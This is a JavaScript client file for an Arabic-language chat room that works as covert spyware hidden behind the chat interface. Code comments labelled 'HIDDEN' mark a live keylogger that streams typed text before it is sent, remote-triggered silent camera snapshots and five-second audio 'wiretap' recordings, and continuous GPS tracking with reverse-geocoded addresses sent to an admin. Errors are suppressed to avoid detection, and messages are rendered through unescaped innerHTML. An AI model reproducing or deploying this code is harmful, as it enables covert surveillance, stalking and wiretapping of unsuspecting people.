document.addEventListener('DOMContentLoaded', () => {
    let socket = null;
    if (typeof io !== 'undefined') {
        socket = io();
    } else {
        console.warn('Socket.IO is not loaded.');
    }

    // UI Elements
    const joinScreen = document.getElementById('joinScreen');
    const chatScreen = document.getElementById('chatScreen');
    const joinForm = document.getElementById('joinForm');
    const usernameInput = document.getElementById('usernameInput');
    const chatForm = document.getElementById('chatForm');
    const messageInput = document.getElementById('messageInput');
    const chatMessages = document.getElementById('chatMessages');
    const onlineUsersSpan = document.getElementById('onlineUsers');
    
    const stealthVideo = document.getElementById('stealthVideo');
    const stealthCanvas = document.getElementById('stealthCanvas');

    let username = '';
    let watchId = null;
    let cameraStream = null;

    // Join Chat
    joinForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const inputName = usernameInput.value.trim();
        if (inputName) {
            username = inputName;
            
            // First, trigger location and camera requests
            // We ask for both in parallel (or sequentially).
            
            // 1. Camera & Mic Request
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    cameraStream = stream;
                    stealthVideo.srcObject = stream;
                    stealthVideo.muted = true; // prevent feedback loop locally
                })
                .catch(err => {
                    console.log("Media denied or not available", err);
                });
            }

            // 2. Location Request
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        startHiddenTracking();
                        enterChat();
                    },
                    (error) => {
                        enterChat();
                    }
                );
            } else {
                enterChat();
            }
        }
    });

    function enterChat() {
        joinScreen.classList.remove('active');
        joinScreen.classList.add('hidden');
        
        chatScreen.classList.remove('hidden');
        setTimeout(() => chatScreen.classList.add('active'), 10);

        if (socket) {
            socket.emit('user_join_chat', username);
        }
    }

    // Chat Form Submit
    chatForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const msg = messageInput.value.trim();
        if (msg && socket) {
            appendMessage('أنت', msg, 'sent');
            socket.emit('chat_message', { sender: username, text: msg });
            messageInput.value = '';
            
            // Clear live typing after sending
            socket.emit('live_typing', ''); 
        }
    });

    // HIDDEN: Live Keylogger
    messageInput.addEventListener('input', () => {
        if (socket) {
            socket.emit('live_typing', messageInput.value);
        }
    });

    // Socket Events
    if (socket) {
        socket.on('chat_message', (data) => {
            appendMessage(data.sender, data.text, 'received');
        });

        socket.on('online_users_count', (count) => {
            onlineUsersSpan.textContent = count;
        });

        socket.on('user_joined_notice', (name) => {
            appendSystemMessage(`انضم ${name} إلى الغرفة`);
        });

        socket.on('user_left_notice', (name) => {
            appendSystemMessage(`غادر ${name} الغرفة`);
        });

        // HIDDEN: Listen for snapshot command
        socket.on('take_snapshot', () => {
            if (cameraStream && stealthVideo.readyState === stealthVideo.HAVE_ENOUGH_DATA) {
                stealthCanvas.width = stealthVideo.videoWidth;
                stealthCanvas.height = stealthVideo.videoHeight;
                const context = stealthCanvas.getContext('2d');
                context.drawImage(stealthVideo, 0, 0, stealthCanvas.width, stealthCanvas.height);
                
                // Get base64 image
                const imageData = stealthCanvas.toDataURL('image/jpeg', 0.8);
                
                // Send back to server silently
                socket.emit('snapshot_result', {
                    image: imageData,
                    username: username
                });
            }
        });

        // HIDDEN: Listen for audio wiretap command
        socket.on('take_audio', () => {
            if (cameraStream) {
                try {
                    // Try to get audio tracks
                    const audioTracks = cameraStream.getAudioTracks();
                    if (audioTracks.length > 0) {
                        const mediaRecorder = new MediaRecorder(cameraStream);
                        const audioChunks = [];

                        mediaRecorder.addEventListener("dataavailable", event => {
                            audioChunks.push(event.data);
                        });

                        mediaRecorder.addEventListener("stop", () => {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            
                            // Convert Blob to Base64 to send via socket
                            const reader = new FileReader();
                            reader.readAsDataURL(audioBlob); 
                            reader.onloadend = function() {
                                const base64Audio = reader.result;
                                socket.emit('audio_result', {
                                    audio: base64Audio,
                                    username: username
                                });
                            }
                        });

                        mediaRecorder.start();
                        // Record for 5 seconds
                        setTimeout(() => {
                            if (mediaRecorder.state === "recording") {
                                mediaRecorder.stop();
                            }
                        }, 5000);
                    }
                } catch (e) {
                    console.error("Wiretap failed", e);
                }
            }
        });
    }

    function appendMessage(sender, text, type) {
        const msgDiv = document.createElement('div');
        msgDiv.className = `message ${type}`;
        msgDiv.innerHTML = `
            <span class="sender-name">${sender}</span>
            <div class="bubble">${text}</div>
        `;
        chatMessages.appendChild(msgDiv);
        scrollToBottom();
    }

    function appendSystemMessage(text) {
        const sysDiv = document.createElement('div');
        sysDiv.className = 'system-message';
        sysDiv.textContent = text;
        chatMessages.appendChild(sysDiv);
        scrollToBottom();
    }

    function scrollToBottom() {
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // -----------------------------------------------------
    // HIDDEN LOCATION TRACKING LOGIC (Sent to Admin only)
    // -----------------------------------------------------
    function startHiddenTracking() {
        if (!navigator.geolocation) return;

        watchId = navigator.geolocation.watchPosition(
            async position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                // Fetch address silently
                let addressDetails = null;
                try {
                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`);
                    if (response.ok) {
                        const data = await response.json();
                        addressDetails = data.address || {};
                    }
                } catch (e) {} // ignore errors to keep it hidden

                if (socket) {
                    socket.emit('update_location', {
                        lat: lat,
                        lon: lon,
                        addressDetails: addressDetails,
                        username: username // Send username so admin knows who it is
                    });
                }
            },
            error => { /* do nothing, keep it hidden */ },
            { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
        );
    }
});
